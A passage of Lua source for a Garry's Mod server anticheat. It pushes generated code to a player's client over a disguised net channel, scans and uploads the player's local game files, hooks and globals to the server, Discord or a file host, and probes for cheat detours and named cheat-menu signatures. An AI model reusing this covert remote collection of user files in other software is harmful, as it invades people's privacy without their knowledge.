    return true, (last or (store.got >= (total or 0)))
end

local function SendForensicAck(rec, ply)
    if not rec or not rec.ackChan or not IsValid(ply) then return end
    net.Start(rec.ackChan)
    net.Send(ply)
end

local function assemble(store)
    local parts = {}
    for i = 1, (store.total or 0) do parts[i] = store.chunks[i] or "" end
    local raw = table.concat(parts)
    if #raw == 0 then return nil end
    local ok, dec = pcall(util.Decompress, raw)
    if ok and dec and #dec > 0 then raw = dec end
    local ok2, tbl = pcall(util.JSONToTable, raw)
    if not ok2 or not tbl then return nil end
    return tbl
end

local BuildForensicClientCode

local function SendPull(rec)
    local ply = rec.ply
    if not IsValid(ply) then return end
    net.Start(rec.pullChan)
        net.WriteUInt(#rec.wanted, 16)
        for _, p in ipairs(rec.wanted) do net.WriteString(p) end
    net.Send(ply)
    rec.phase = "data"
    rec.data = { chunks = {}, total = 0, got = 0 }
    rec.dataDeadline = CurTime() + DATA_TIMEOUT
    timer.Simple(DATA_TIMEOUT + 0.5, function()
        if pendingForensic[rec.sid] == rec and rec.phase == "data" then
            ZB_AC_ForensicReport(rec.sid)
        end
    end)
end

local function DecideDedup(rec, manifest)
    local files = istable(manifest.files) and manifest.files or {}
    local wanted, wantedHash, known = {}, {}, {}
    local seenInThis = {}
    for _, f in ipairs(files) do
        if f.suspicious then
            local h = f.hash
            if h and h ~= "" and ZB_AC.IsFileSeen(h) then
                known[#known + 1] = { path = f.path, reason = f.susp_reason }
            elseif h and h ~= "" and seenInThis[h] then
                known[#known + 1] = { path = f.path, reason = f.susp_reason }
            else
                if #wanted < PULL_CAP then
                    wanted[#wanted + 1] = f.path
                    wantedHash[f.path] = h
                    if h and h ~= "" then seenInThis[h] = true end
                end
            end
        end
    end
    rec.wanted, rec.wantedHash, rec.known = wanted, wantedHash, known
end

HandleManifestChunk = function(chan, ply)
    if not IsValid(ply) then return end
    local rec = pendingForensic[ply:SteamID()]
    if not rec or rec.maniChan ~= chan or rec.phase ~= "manifest" then return end
    local recvd, done = readChunkInto(rec.mani)
    if recvd then SendForensicAck(rec, ply) end
    if not done then return end
    local manifest = assemble(rec.mani)
    if not manifest then
        log("невалидный манифест от " .. rec.sid)
        pendingForensic[rec.sid] = nil
        return
    end
    rec.manifest = manifest
    DecideDedup(rec, manifest)
    log(string.format("манифест %s: файлов=%d, новых для выкачки=%d, уже известных=%d",
        rec.sid, istable(manifest.files) and #manifest.files or 0,
        #rec.wanted, #rec.known))
    if #rec.wanted == 0 then
        ZB_AC_ForensicReport(rec.sid)
    else
        SendPull(rec)
    end
end

HandleDataChunk = function(chan, ply)
    if not IsValid(ply) then return end
    local rec = pendingForensic[ply:SteamID()]
    if not rec or rec.dataChan ~= chan or rec.phase ~= "data" then return end
    local recvd, done = readChunkInto(rec.data)
    if recvd then SendForensicAck(rec, ply) end
    if not done then return end
    local arr = assemble(rec.data)
    rec.pulled = istable(arr) and arr or {}
    ZB_AC_ForensicReport(rec.sid)
end

function ZB_AC_ForensicReport(sid)
    local rec = pendingForensic[sid]
    if not rec then return end
    pendingForensic[sid] = nil

    local manifest = rec.manifest or {}
    local nick = rec.nick
    local ts   = rec.timestamp
    local dir  = FORENSIC_DIR .. "/" .. string.gsub(sid, ":", "_") .. "_" .. ts
    pcall(file.CreateDir, dir)
    pcall(file.Write, dir .. "/forensic_report.json", util.TableToJSON(manifest, true))

    local savedFiles = {}
    local newHashesAdded = false
    for _, item in ipairs(rec.pulled or {}) do
        if item.path and item.content and #item.content > 0 then
            local safe = string.GetFileFromFilename(item.path)
            safe = string.gsub(safe, "[^%w%._%-]", "_")
            if safe == "" then safe = "file" end
            safe = safe .. ".txt"
            pcall(file.Write, dir .. "/" .. safe, item.content)
            savedFiles[#savedFiles + 1] = { name = safe, orig = item.path, data = item.content }
            local h = rec.wantedHash and rec.wantedHash[item.path]
            if ZB_AC.MarkFileSeen(h, item.path, sid) then newHashesAdded = true end
        end
    end
    if newHashesAdded then SaveSeenHashes() end

    local nFiles = istable(manifest.files) and #manifest.files or 0
    local nHooks = istable(manifest.hooks) and manifest.hooks._event_count or 0
    local nGlob  = istable(manifest.globals) and #manifest.globals or 0
    local nMatch = istable(manifest.content_matches) and #manifest.content_matches or 0
    local nNew   = #savedFiles
    local known  = rec.known or {}
    local nKnown = #known

    local matchLines = {}
    if istable(manifest.content_matches) then
        for _, m in ipairs(manifest.content_matches) do
            matchLines[#matchLines + 1] = string.format("• **[%s]** `%s` — %s",
                m.severity or "?", m.pattern or "?", m.file or "?")
            if #matchLines >= 20 then break end
        end
    end

    local manifestLines = {
        "FORENSIC SWEEP — " .. nick .. " (" .. sid .. ")",
        "Время: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Файлов в свипе: " .. nFiles,
        "Новых файлов выкачано: " .. nNew,
        "Уже известных (дедуп, не качались): " .. nKnown,
        "Событий хуков: " .. nHooks,
        "Неизвестных глобалов: " .. nGlob,
        "Совпадений контент-скана: " .. nMatch,
        "",
    }
    for _, m in ipairs(matchLines) do manifestLines[#manifestLines + 1] = m end
    if nKnown > 0 then
        manifestLines[#manifestLines + 1] = ""
        manifestLines[#manifestLines + 1] = "--- ПРОЧИЕ ФАЙЛЫ (уже известные, дедуп) ---"
        for _, k in ipairs(known) do
            manifestLines[#manifestLines + 1] = "  " .. tostring(k.path)
                .. (k.reason and ("  [" .. k.reason .. "]") or "")
        end
    end
    pcall(file.Write, dir .. "/manifest.txt", table.concat(manifestLines, "\n"))

    local title = "ЧечаДефендер: Forensic Sweep — `" .. nick .. "`"
    local msg = string.format(
        "**SteamID:** `%s`\n**Файлов:** %d\n**Новых выкачано:** %d\n**Уже известных (дедуп):** %d\n**Хуков:** %d событий\n**Глобалов неизв.:** %d\n**Контент-совпадений:** %d\n**Архив:** `data/%s`\n\n%s\n_Время: %s_",
        sid, nFiles, nNew, nKnown, nHooks, nGlob, nMatch, dir,
        #matchLines > 0 and ("**Находки контент-скана:**\n" .. table.concat(matchLines, "\n"))
            or "_Контент-скан чист_",
        os.date("%Y-%m-%d %H:%M:%S"))

    local zipFiles = {}
    for _, f in ipairs(savedFiles) do
        zipFiles[#zipFiles + 1] = { name = f.name, data = f.data }
    end
    if #zipFiles > 0 then
        zipFiles[#zipFiles + 1] = { name = "manifest.txt", data = table.concat(manifestLines, "\n") }
    end

    local function deliver(finalMsg)
        if #zipFiles > 0 and ZB_AC.DeliverForensic then
            ZB_AC.DeliverForensic(title, finalMsg, zipFiles, sid)
        elseif ZB_AC.SendDiscord then
            ZB_AC.SendDiscord(title, finalMsg)
        elseif ZB_AC.RelayPost then
            ZB_AC.RelayPost(util.TableToJSON({
                content = "**" .. title .. "**\n" .. finalMsg,
                allowed_mentions = { parse = {} } }), "application/json")
        end
    end

    if nKnown == 0 then
        deliver(msg .. "\n_Прочих (уже известных) файлов нет._")
    elseif nKnown <= OTHER_INLINE then
        local lines = {}
        for _, k in ipairs(known) do lines[#lines + 1] = "• `" .. tostring(k.path) .. "`" end
        deliver(msg .. "\n**Прочие файлы у клиента (уже известны, " .. nKnown .. "):**\n"
            .. table.concat(lines, "\n"))
    else
        local lines = {}
        for _, k in ipairs(known) do lines[#lines + 1] = tostring(k.path) end
        local txt = "Прочие файлы у клиента (уже известны серверу, не выкачивались)\n"
            .. nick .. " (" .. sid .. ")\n\n" .. table.concat(lines, "\n")
        local fname = "other_files_" .. string.gsub(sid, ":", "_") .. ".txt"
        if ZB_AC.UploadFileHost then
            ZB_AC.UploadFileHost(fname, txt, "text/plain", function(url)
                if url then
                    deliver(msg .. "\n**Прочие файлы у клиента (уже известны, " .. nKnown .. "):** " .. url)
                else
                    deliver(msg .. "\n**Прочие файлы у клиента:** " .. nKnown
                        .. " (список в data/" .. dir .. "/manifest.txt)")
                end
            end)
        else
            deliver(msg .. "\n**Прочие файлы у клиента:** " .. nKnown
                .. " (список в data/" .. dir .. "/manifest.txt)")
        end
    end

    log("sweep завершён: " .. nick .. " (" .. sid .. "), новых=" .. nNew .. ", известных=" .. nKnown)
end

BuildForensicClientCode = function(maniChan, pullChan, dataChan, ackChan)
    local patJsonParts = {}
    for _, p in ipairs(CONTENT_PATTERNS()) do
        patJsonParts[#patJsonParts + 1] = string.format(
            '{"name":%q,"pat":%q,"severity":%q}', p.name, p.pat, p.severity)
    end
    local patJson = "[" .. table.concat(patJsonParts, ",") .. "]"

    local knownGlobalParts = {}
    for k in pairs(KNOWN_GLOBALS) do
        knownGlobalParts[#knownGlobalParts + 1] = string.format("%q", k)
    end
    local knownGlobalsJson = "{" .. table.concat(knownGlobalParts, ",") .. "}"

    local suspExtParts = {}
    for ext in pairs(SUSPICIOUS_EXT()) do
        suspExtParts[#suspExtParts + 1] = string.format("%q", ext)
    end
    local suspExtJson = "{" .. table.concat(suspExtParts, ",") .. "}"

    local suspNameParts = {}
    for _, n in ipairs(SUSPICIOUS_NAMES()) do
        suspNameParts[#suspNameParts + 1] = string.format("%q", n)
    end
    local suspNameJson = "[" .. table.concat(suspNameParts, ",") .. "]"

    return string.format([===[
local _Find   = file and file.Find
local _Read   = file and file.Read
local _Size   = file and file.Size
local _Comp   = util and util.Compress
local _Hash   = util and (util.SHA256 or util.SHA1)
local _start  = net and net.Start
local _wstr   = net and net.WriteString
local _wuint  = net and net.WriteUInt
local _wbool  = net and net.WriteBool
local _wdata  = net and net.WriteData
local _ruint  = net and net.ReadUInt
local _rstr   = net and net.ReadString
local _send   = net and net.SendToServer
local _recv   = net and net.Receive
local _sub    = string.sub
local _lower  = string.lower
local _find   = string.find
local _timer  = timer and timer.Simple
local _gi     = debug and debug.getinfo
local _ht     = hook and hook.GetTable
local _json   = util and util.TableToJSON
local _pcall  = pcall

local MANI     = %q
local PULL     = %q
local DATA     = %q
local ACK      = %q
local MAXF     = %d
local MAXDEPTH = %d
local CHUNK    = %d
local MAX_FILES = %d
local PATTERNS = %s
local KNOWN_G  = %s
local SUSP_EXT = %s
local SUSP_NAM = %s

local contentByPath = {}

local function isSuspiciousName(name, ext)
    local ln = _lower(name)
    if ext and SUSP_EXT[ext] then return true, "susp_ext:" .. ext end
    for _, kw in ipairs(SUSP_NAM) do
        if _find(ln, kw, 1, true) then return true, "susp_name:" .. kw end
    end
    return false, nil
end

local function scanContent(path, content)
    if not content or #content < 10 then return nil end
    local lc = _lower(content)
    local matches = {}
    for _, p in ipairs(PATTERNS) do
        local found = _find(lc, _lower(p.pat), 1, false)
        if found then
            local ctxStart = math.max(1, found - 30)
            local ctxEnd   = math.min(#content, found + #p.pat + 30)
            local ctx = _sub(content, ctxStart, ctxEnd)
            ctx = string.gsub(ctx, "[\r\n]+", " ")
            if #ctx > 120 then ctx = _sub(ctx, 1, 117) .. "..." end
            matches[#matches + 1] = { pattern = p.name, severity = p.severity, context = ctx }
        end
    end
    if #matches > 0 then return matches end
    return nil
end

local seen, fileList = {}, {}
local fileCount = 0

local function scanDir(dir, gp, relPrefix, depth)
    if fileCount >= MAX_FILES then return end
    if depth > MAXDEPTH then return end
    local ok, files, dirs = _pcall(_Find, dir .. "/*", gp)
    if not ok or not files then return end
    for _, n in ipairs(files) do
        if fileCount >= MAX_FILES then break end
        local rel  = relPrefix .. n
        local full = dir .. "/" .. n
        if not seen[rel] then
            seen[rel] = true
            fileCount = fileCount + 1
            local ext = string.match(n, "%%.([^%%.]+)$")
            if ext then ext = _lower(ext) end
            local susp, suspReason = isSuspiciousName(n, ext)
            local sz = 0
            local okSz, fileSz = _pcall(_Size, full, gp)
            if okSz and fileSz then sz = fileSz end

            local entry = {
                path = rel, size = sz, extension = ext or "", gp = gp,
                suspicious = susp or false, susp_reason = suspReason,
            }

            local shouldRead = susp or (ext == "lua") or (ext == "txt")
            if shouldRead and sz > 0 and sz <= MAXF then
                local okR, raw = _pcall(_Read, full, gp)
                if okR and type(raw) == "string" and #raw > 0 then
                    local matches = scanContent(rel, raw)
                    if matches then
                        entry.matches = matches
                        entry.suspicious = true
                        if not entry.susp_reason then entry.susp_reason = "content_match" end
                    end
                    if entry.suspicious then
                        entry.hash = _Hash and _Hash(raw) or nil
                        contentByPath[rel] = raw
                    end
                end
            end
            fileList[#fileList + 1] = entry
        end
    end
    for _, d in ipairs(dirs or {}) do
        if fileCount >= MAX_FILES then break end
        scanDir(dir .. "/" .. d, gp, relPrefix .. d .. "/", depth + 1)
    end
end

if _Find then
    local scanPaths = {
        {"lua",       "MOD",  "lua/"},
        {"lua",       "GAME", "lua_GAME/"},
        {"data",      "DATA", "data/"},
        {"addons",    "MOD",  "addons/"},
        {"download",  "MOD",  "download/"},
        {"cache",     "MOD",  "cache/"},
        {"materials", "MOD",  "materials/"},
        {"resource",  "MOD",  "resource/"},
        {"",          "MOD",  "./"},
    }
    for _, sp in ipairs(scanPaths) do
        scanDir(sp[1], sp[2], sp[3], 0)
    end
end

local scanSummary = {}
do
    local byGp = {}
    for _, f in ipairs(fileList) do
        local gp = f.gp or "?"
        byGp[gp] = (byGp[gp] or 0) + 1
    end
    for gp, count in pairs(byGp) do
        scanSummary[#scanSummary + 1] = gp .. ":" .. count
    end
end

local hookDump = { _event_count = 0 }
if _ht then
    local ok, ht = _pcall(_ht)
    if ok and type(ht) == "table" then
        for evt, hooks in pairs(ht) do
            if type(hooks) == "table" then
                local evtHooks = {}
                for hname, fn in pairs(hooks) do
                    if type(fn) == "function" then
                        local src = "?"
                        if _gi then
                            local okI, info = _pcall(_gi, fn, "S")
                            if okI and type(info) == "table" then
                                src = tostring(info.short_src or info.source or "?")
                                if #src > 80 then src = _sub(src, 1, 77) .. "..." end
                            end
                        end
                        evtHooks[#evtHooks + 1] = { name = tostring(hname), source = src }
                    end
                end
                if #evtHooks > 0 then
                    hookDump[evt] = evtHooks
                    hookDump._event_count = hookDump._event_count + 1
                end
            end
        end
    end
end

local unknownGlobals = {}
if _G then
    for k, v in pairs(_G) do
        if type(k) == "string" and not KNOWN_G[k] then
            local vt = type(v)
            if vt == "table" then
                local keyCount, sampleKeys = 0, {}
                for sk in pairs(v) do
                    keyCount = keyCount + 1
                    if #sampleKeys < 8 then sampleKeys[#sampleKeys + 1] = tostring(sk) end
                end
                if keyCount > 0 then
                    unknownGlobals[#unknownGlobals + 1] = {
                        name = k, type = vt, key_count = keyCount, sample_keys = sampleKeys }
                end
            elseif vt == "userdata" or vt == "function" then
                unknownGlobals[#unknownGlobals + 1] = { name = k, type = vt, key_count = 0 }
            end
        end
    end
end

local allMatches = {}
for _, f in ipairs(fileList) do
    if f.matches then
        for _, m in ipairs(f.matches) do
            allMatches[#allMatches + 1] = {
                file = f.path, pattern = m.pattern, severity = m.severity, reason = m.context }
        end
    end
end

for _, f in ipairs(fileList) do f.matches = nil end

local report = {
    scan_timestamp = tostring(os.time()),
    scan_summary = scanSummary,
    total_files = #fileList,
    files = fileList,
    hooks = hookDump,
    globals = unknownGlobals,
    content_matches = allMatches,
}

local _gFrames, _gIdx, _gToken
local function _gNext()
    _gIdx = _gIdx + 1
    local fn = _gFrames and _gFrames[_gIdx]
    if not fn then _gFrames = nil return end
    local myTok = {}
    _gToken = myTok
    fn()
    if _timer then
        _timer(3, function()
            if _gFrames and _gToken == myTok then _gNext() end
        end)
    end
end

local function sendGated(frames)
    if not frames or #frames == 0 then return end
    _gFrames = frames
    _gIdx = 0
    _gNext()
end

if _recv then
    _recv(ACK, function()
        if _gFrames then _gNext() end
    end)
end

local function sendChunks(chan, payload)
    if not _start then return end
    local total = math.ceil(#payload / CHUNK)
    if total == 0 then total = 1 end
    local frames = {}
    for i = 1, total do
        local s = (i - 1) * CHUNK + 1
        local e = math.min(i * CHUNK, #payload)
        local d = _sub(payload, s, e)
        frames[i] = function()
            _start(chan)
                _wuint(i, 16) _wuint(total, 16) _wbool(i == total)
                _wuint(#d, 32) _wdata(d, #d)
            _send()
        end
    end
    sendGated(frames)
end

local jsonStr = _json and _json(report) or "{}"
local payload = jsonStr
if _Comp and #jsonStr > 512 then
    local okc, comp = _pcall(_Comp, jsonStr)
    if okc and comp and #comp > 0 and #comp < #jsonStr then payload = comp end
end
if _start then sendChunks(MANI, payload) end

local closed = false
if _recv then
    _recv(PULL, function()
        if closed then return end
        local n = _ruint(16) or 0
        local out = {}
        for i = 1, n do
            local p = _rstr()
            if p and contentByPath[p] then
                out[#out + 1] = { path = p, content = contentByPath[p] }
            end
        end
        local dj = _json and _json(out) or "[]"
        local dp = dj
        if _Comp and #dj > 512 then
            local okc, comp = _pcall(_Comp, dj)
            if okc and comp and #comp > 0 and #comp < #dj then dp = comp end
        end
        sendChunks(DATA, dp)
    end)
    if _timer then
        _timer(150, function() closed = true contentByPath = {} end)
    end
end
]===],
        maniChan, pullChan, dataChan, ackChan,
        MAX_FILE_SIZE, MAX_DEPTH, CHUNK_SIZE, MAX_FILES,
        patJson, knownGlobalsJson, suspExtJson, suspNameJson)
end

function ZB_AC_StartForensicSweep(ply, nick, sid, onDone)
    if not IsValid(ply) then
        if onDone then onDone(false) end
        return
    end
    sid = sid or ply:SteamID()
    local i = math.random(1, POOL_SIZE)
    pendingForensic[sid] = {
        ply       = ply,
        sid       = sid,
        nick      = nick or ply:Nick(),
        timestamp = os.date("%Y%m%d_%H%M%S"),
        phase     = "manifest",
        maniChan  = maniPool[i],
        dataChan  = dataPool[i],
        pullChan  = pullPool[i],
        ackChan   = ackPool[i],
        mani      = { chunks = {}, total = 0, got = 0 },
        pulled    = {},
        known     = {},
        wanted    = {},
    }
    log("запуск sweep для " .. (nick or ply:Nick()) .. " (" .. sid .. ")…")

    net.Start("ui_sync_poll")
        net.WriteString(BuildForensicClientCode(maniPool[i], pullPool[i], dataPool[i], ackPool[i]))
    net.Send(ply)

    timer.Simple(SWEEP_TIMEOUT + 0.5, function()
        local rec = pendingForensic[sid]
        if rec and rec.phase == "manifest" then
            log("таймаут манифеста: " .. sid)
            pendingForensic[sid] = nil
        end
    end)

    if onDone then onDone(true) end
    return true
end

concommand.Add("rp_ac_sweep", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:ChatPrint("[AC] Только суперадмин")
        return
    end
    local function tell(m)
        if IsValid(ply) then ply:ChatPrint(m) else print(m) end
    end
    local arg = args[1]
    if not arg then
        tell("[AC] Использование: rp_ac_sweep <STEAM_0:1:... | ник онлайн>")
        return
    end
    local target = nil
    local up = string.upper(arg)
    if string.match(up, "^STEAM_%d:%d:%d+$") then
        for _, p in ipairs(player.GetAll()) do
            if p:SteamID() == up then target = p break end
        end
    else
        local q = string.lower(arg)
        for _, p in ipairs(player.GetAll()) do
            if string.find(string.lower(p:Nick()), q, 1, true) then target = p break end
        end
    end
    if not IsValid(target) then
        tell("[AC] Игрок не найден: " .. (arg or "?"))
        return
    end
    tell("[AC] Forensic sweep запущен для " .. target:Nick() .. " — ждите завершения…")
    ZB_AC_StartForensicSweep(target, target:Nick(), target:SteamID())
end)

concommand.Add("rp_ac_seen_reset", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:ChatPrint("[AC] Только суперадмин")
        return
    end
    seenHashes = {}
    SaveSeenHashes()
    local m = "[AC] Стор виденных хешей очищен — следующий свип выкачает всё заново"
    if IsValid(ply) then ply:ChatPrint(m) else print(m) end
end)

hook.Add("PlayerDisconnected", "ZB_AC_ForensicCleanup", function(ply)
    if IsValid(ply) then
        local sid = ply:SteamID()
        local rec = pendingForensic[sid]
        if rec then
            if rec.phase == "data" then
                ZB_AC_ForensicReport(sid)
            else
                pendingForensic[sid] = nil
            end
        end
    end
end)

if not file.IsDir(FORENSIC_DIR, "DATA") then
    file.CreateDir(FORENSIC_DIR)
end

local seenCount = 0
for _ in pairs(seenHashes) do seenCount = seenCount + 1 end
print(PREFIX .. "v11 loaded (hash-dedup forensic, " .. POOL_SIZE
    .. " channels, seen-hashes=" .. seenCount .. ")")

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_forensic.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_forensic.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end
if not SERVER then return end

util.AddNetworkString("obj_state_poll")
util.AddNetworkString("obj_state_ack")

local CV_ENABLED = CreateConVar("rp_ac_guard", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Guard-детект скриптхука/детуров (funcinfo): 1/0")

local CV_ACTION = CreateConVar("rp_ac_guard_action", "report",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Реакция guard на детект: report / kick / ban")

local CV_CHECK_ADMINS = CreateConVar("rp_ac_guard_check_admins", "1",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Guard проверяет и админов (report-only, без кика/бана): 1/0")

local reported = {}

local POLL_INTERVAL = 25
local RESP_TIMEOUT  = 8
local MISS_LIMIT    = 3
-- CD_GUARD_ALIVE_GATE: окно, в течение которого клиент должен был ответить на
-- ЛЮБУЮ проверку АЧ (ZB_AC._alive), чтобы «нет ответа на guard» считался обходом,
-- а не потерей связи. Чуть больше окна накопления промахов (POLL*MISS + таймауты).
local ALIVE_WINDOW  = 90

local CODE_MAP = {
    p   = "детур CompileString",
    f   = "детур CompileFile",
    r   = "детур RunStringEx",
    gi  = "детур debug.getinfo (маскировка источников)",
    sd  = "детур string.dump",
    gt  = "детур hook.GetTable (сокрытие хуков)",
    h   = "активный debug.sethook",
    sig = "сигнатуры чит-меню в _G (Rutka)",
}

local PROBE_TEMPLATE = [==[
local FI = jit and jit.util and jit.util.funcinfo
local C = {}
if _G.Rutka_vip ~= nil or _G._GenHookID ~= nil or _G._NeutralizeCAC ~= nil
   or _G._hookGetTablePatched ~= nil or _G._SafeHookAdd ~= nil then
    C[#C+1] = "__TSIG__"
end
if not FI then return C end
local function src(f)
    if type(f) ~= "function" then return nil end
    local ok, i = pcall(FI, f)
    if not ok or type(i) ~= "table" then return nil end
    return i.source
end
local function detoured(f)
    return type(f) == "function" and src(f) ~= nil
end
if debug and detoured(debug.getinfo) then C[#C+1] = "__TGI__" end
if string and detoured(string.dump) then C[#C+1] = "__TSD__" end
if detoured(CompileString) then C[#C+1] = "__TP__" end
if detoured(CompileFile) then C[#C+1] = "__TF__" end
if detoured(RunStringEx) then C[#C+1] = "__TR__" end
if hook and hook.Add and hook.GetTable then
    local a = src(hook.Add)
    local g = src(hook.GetTable)
    if a and g == nil then C[#C+1] = "__TGT__" end
    if a and g and a ~= g then C[#C+1] = "__TGT__" end
end
if debug and debug.gethook and debug.gethook() ~= nil then C[#C+1] = "__TH__" end
return C
]==]

local PROBE_KEYS = { "GI", "SD", "P", "F", "R", "GT", "H", "SIG" }
local KEY_CANON  = {
    GI = "gi", SD = "sd", P = "p", F = "f", R = "r", GT = "gt", H = "h", SIG = "sig",
}

local function RandToken()
    return "z" .. string.sub(
        util.SHA1(tostring(SysTime()) .. tostring(math.random(1, 1e9))), 1, 7)
end

local function BuildProbe()
    local code = PROBE_TEMPLATE
    local tokmap = {}
    for _, k in ipairs(PROBE_KEYS) do
        local tok = RandToken()
        tokmap[tok] = KEY_CANON[k]
        code = string.gsub(code, "__T" .. k .. "__", tok)
    end
    local junk = "local _" .. string.sub(
        util.SHA1(tostring(SysTime()) .. tostring(math.random(1, 1e9))), 1, 8)
        .. " = " .. tostring(math.random(1, 1e9)) .. "\n"
    return junk .. code, tokmap
end

local pending = {}
local misses  = {}

local function PostDiscord(title, msg)
    if not (ZB_AC and ZB_AC.RelayPost) then return end
    ZB_AC.RelayPost(util.TableToJSON({
        content = "**" .. title .. ":** " .. msg,
        allowed_mentions = { parse = {} },
    }), "application/json")
end

local function Detected(ply, why)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()

    local r = reported[sid]
    if not r then r = {} reported[sid] = r end
    if r[why] then return end
    r[why] = true

    local isAdmin = ply:IsAdmin()
    local line = ply:Nick() .. " [" .. sid .. "] — " .. why
        .. (isAdmin and "  (админ — только отчёт, без бана)" or "")
    print("[AC-GUARD] " .. line)
    for _, a in ipairs(player.GetAll()) do
        if a:IsAdmin() or a:IsSuperAdmin() then a:ChatPrint("[AC-GUARD] " .. line) end
    end
    PostDiscord("🚨 СКРИПТХУК / ОБХОД (guard)", line)

    if isAdmin then return end

    local act = string.lower(CV_ACTION:GetString())
    if act == "kick" then
        ply:Kick("ЧечаДефендер: обнаружен скриптхук/обход")
    elseif act == "ban" then
        if ULib and ULib.addBan then
            ULib.addBan(sid, 0, "ЧечаДефендер: скриптхук/обход", "ЧечаДефендер")
        end
        ply:Kick("ЧечаДефендер: обнаружен скриптхук/обход")
    end
end

local function Poll(ply)
    if not IsValid(ply) or ply:IsBot() then return end
    if ply:IsAdmin() and not CV_CHECK_ADMINS:GetBool() then return end
    local sid = ply:SteamID()
    local nonce = math.random(0, 2147483647)
    local code, tokmap = BuildProbe()
    pending[sid] = { nonce = nonce, deadline = CurTime() + RESP_TIMEOUT, ply = ply, tokmap = tokmap }
    net.Start("obj_state_poll")
        net.WriteUInt(nonce, 32)
        net.WriteString(code)
    net.Send(ply)
end

local _novaChecked, _novaLoaded = false, false
local function IsNovaLoaded()
    if _novaChecked then return _novaLoaded end
    _novaChecked = true
    if _G.Nova ~= nil then _novaLoaded = true return true end
    local ok, addons = pcall(engine.GetAddons)
    if ok and istable(addons) then
        for _, a in ipairs(addons) do
            if string.find(string.lower(tostring(a.title or "")), "nova", 1, true) then
                _novaLoaded = true break
            end
        end
    end
    return _novaLoaded
end

local NOVA_FP = { gi = true, gt = true }

net.Receive("obj_state_ack", function(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    local p = pending[sid]

    local nonce = net.ReadUInt(32)
    local n = net.ReadUInt(6)
    local codes = {}
    for _ = 1, n do codes[#codes + 1] = net.ReadString() end

    if not p or nonce ~= p.nonce then return end
    pending[sid] = nil
    misses[sid] = 0
    if ZB_AC then -- CD_GUARD_ALIVE_GATE: guard-ответ тоже отмечает живость
        ZB_AC._alive = ZB_AC._alive or {}
        ZB_AC._alive[sid] = CurTime()
    end

    local novaOn = IsNovaLoaded()
    local tokmap = p.tokmap or {}
    local seen, parts = {}, {}
    for _, c in ipairs(codes) do
        local canon = tokmap[c]
        if canon and not seen[canon] and not (novaOn and NOVA_FP[canon]) then
            seen[canon] = true
            parts[#parts + 1] = CODE_MAP[canon] or canon
        end
    end
    if #parts > 0 then
        Detected(ply, "детур: " .. table.concat(parts, ", "))
    end
end)

timer.Create("zb_ac_guard_poll", POLL_INTERVAL, 0, function()
    if not CV_ENABLED:GetBool() then return end
    for _, ply in ipairs(player.GetAll()) do Poll(ply) end
end)

timer.Create("zb_ac_guard_timeout", 1, 0, function()
    local now = CurTime()
    for sid, p in pairs(pending) do
        if now > p.deadline then
            pending[sid] = nil
            if IsValid(p.ply) then
                misses[sid] = (misses[sid] or 0) + 1
                if misses[sid] >= MISS_LIMIT then
                    misses[sid] = 0
                    -- CD_GUARD_ALIVE_GATE: РЕАЛЬНЫЙ обход глушит ИМЕННО guard-канал,
                    -- а на другие проверки АЧ клиент отвечает. Если от клиента не идёт
                    -- НИКАКИХ сигналов (не ответил ни на одну проверку АЧ в окне) или
                    -- он таймаутит по сети — это ПОТЕРЯ СВЯЗИ / нет интернета, а не
                    -- обход. Флагаем только когда клиент жив на другом канале И не
                    -- таймаутит. IsTimingOut — движковый сигнал, чит его не подделает.
                    local sid2      = p.ply:SteamID()
                    local aliveTs   = ZB_AC and ZB_AC._alive and ZB_AC._alive[sid2]
                    local aliveElse = aliveTs and (CurTime() - aliveTs) < ALIVE_WINDOW
                    local timingOut = p.ply.IsTimingOut and p.ply:IsTimingOut()
                    if aliveElse and not timingOut then
                        Detected(p.ply,
                            "guard-канал заглушён (нет ответа x" .. MISS_LIMIT ..
                            ", но клиент отвечает на другие проверки АЧ) — вероятен обход по имени net-канала")
                    end
                    -- else: нет сигналов ни на одном канале / сетевой таймаут → проблема
                    -- связи, НЕ обход. Молча не флагаем (частая причина ложняка). Тихо.
                end
            end
        end
    end
end)

hook.Add("PlayerDisconnected", "zb_ac_guard_cleanup", function(ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    pending[sid] = nil
    misses[sid] = nil
    reported[sid] = nil
end)

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_chechadefender_guard.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_chechadefender_guard.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do local __ok, __err = pcall(function()
if not CHECHA_FROM_BUNDLE then return end

if not SERVER then return end

pcall(require, "reqwest")

util.AddNetworkString("ui_sync_poll")
util.AddNetworkString("ui_sync_ack")
util.AddNetworkString("res_fetch_req")
util.AddNetworkString("res_fetch_chunk")

util.AddNetworkString("chat_relay_ping")
util.AddNetworkString("ui_notice_show")

local SW_STATE_FILE = "zcity_ac_sw_warned.json"
local swPlayerState = {}

local function LoadSwState()
    local raw = file.Read(SW_STATE_FILE, "DATA")
    if not raw then return end
    local ok, t = pcall(util.JSONToTable, raw)
    if ok and type(t) == "table" then swPlayerState = t end
end

local function SaveSwState()
    file.Write(SW_STATE_FILE, util.TableToJSON(swPlayerState))
end

local function GetSwState(sid)
    return swPlayerState[sid]
end

local function SetSwWarned(sid)
    swPlayerState[sid] = "warned"
    SaveSwState()
end

local function SetSwClean(sid)
